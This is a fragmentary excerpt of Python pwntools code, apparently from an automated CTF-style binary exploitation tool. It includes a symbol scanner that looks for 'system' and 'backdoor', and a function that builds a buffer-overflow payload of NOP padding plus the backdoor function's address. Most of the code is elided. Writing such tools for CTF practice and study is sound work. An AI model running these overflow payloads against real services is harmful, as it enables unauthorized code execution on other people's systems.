...
def Objdump_Scan(program):
	...
	target_functions = ["write", "puts", "printf", "main", "system","backdoor"]
	function_addresses = {}
	found_functions = []
...
def pie_backdoor_exploit(program,padding,backdoor,libc_path,libc):	
	elf = ELF(program)
	backdoor = elf.symbols["backdoor"]
	payload = asm("nop") * padding + p64(backdoor)
...
if __name__ == '__main__':
	...
	if padding == 0:
		...
		if url and port:
			...
			#	pie_backdoor_exploit(program,padding,backdoor,libc_path,libc)
			#	sys.exit(0)
